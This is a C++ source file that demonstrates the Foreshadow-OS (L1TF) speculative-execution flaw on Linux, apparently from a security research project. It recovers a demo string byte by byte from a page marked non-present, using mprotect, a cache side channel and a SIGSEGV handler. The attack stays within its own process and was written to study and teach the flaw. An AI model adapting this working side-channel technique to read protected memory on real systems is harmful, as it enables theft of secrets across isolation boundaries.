/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "compiler_specifics.h"

#ifndef __linux__
#  error Unsupported OS. Linux required.
#endif

#if !defined(SAFESIDE_X64) && !defined(SAFESIDE_IA32) && !defined(SAFESIDE_PPC)
#  error Unsupported architecture. Intel or PowerPC required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include <fcntl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <signal.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"

const char *private_data = "It's a s3kr3t!!!";
char *private_page = nullptr;

/**
 * Demonstrates the Foreshadow-OS vulnerability - speculatively using non
 * present pages for accessing unreachable memory. This is the simplest form of
 * foreshadow that does not cross VM or SGX enclave boundaries.
 *
 * On older versions of Linux kernel (explicitly tested on 4.12.5) the mprotect
 * call with PROT_NONE clears the present bit of the page, but the physical
 * offset of that page is still speculatively used before the fault is
 * triggered.
 **/
static char leak_byte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    for (int i = 0; i < 256; ++i) {
      // Load the private_page into L1 cache.
      ForceRead(private_page);

      // Flip the "present" bit in the private_page table record.
      mprotect(private_page, kPageSizeBytes, PROT_NONE);

      // Block any speculation forward.
      MemoryAndSpeculationBarrier();

      // Access the non-present private_page. That leads to a SEGFAULT.
      ForceRead(isolated_oracle.data() +
                static_cast<size_t>(private_page[offset]));

      std::cout << "Dead code. Must not be printed." << std::endl;

      // The exit call must not be unconditional, otherwise clang would
      // optimize out everything that follows it and the linking would fail.
      if (strlen(private_data) != 0) {
        exit(EXIT_FAILURE);
      }

      // SIGSEGV signal handler moves the instruction pointer to this label.
      asm volatile("afterspeculation:");

      // Flip back the "present" bit in the private_page table record.
      mprotect(private_page, kPageSizeBytes, PROT_READ | PROT_WRITE);
    }

    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static void sigsegv(
    int /* signum */, siginfo_t * /* siginfo */, void *context) {
  // SIGSEGV signal handler.
  // Moves the instruction pointer to the "afterspeculation" label.
  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
#ifdef SAFESIDE_X64
  ucontext->uc_mcontext.gregs[REG_RIP] =
      reinterpret_cast<greg_t>(afterspeculation);
#elif defined(SAFESIDE_IA32)
  ucontext->uc_mcontext.gregs[REG_EIP] =
      reinterpret_cast<greg_t>(afterspeculation);
#elif defined(SAFESIDE_PPC)
  ucontext->uc_mcontext.regs->nip =
      reinterpret_cast<size_t>(afterspeculation);
#else
#  error Unsupported CPU.
#endif
}

static void set_signal() {
  struct sigaction act;
  act.sa_sigaction = sigsegv;
  act.sa_flags = SA_SIGINFO;
  sigaction(SIGSEGV, &act, NULL);
}

int main() {
  set_signal();
  private_page = reinterpret_cast<char *>(mmap(nullptr, kPageSizeBytes,
      PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));
  memcpy(private_page, private_data, strlen(private_data) + 1);
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << leak_byte(i);
    std::cout.flush();
  }
  munmap(private_page, kPageSizeBytes);
  std::cout << "\nDone!\n";
}
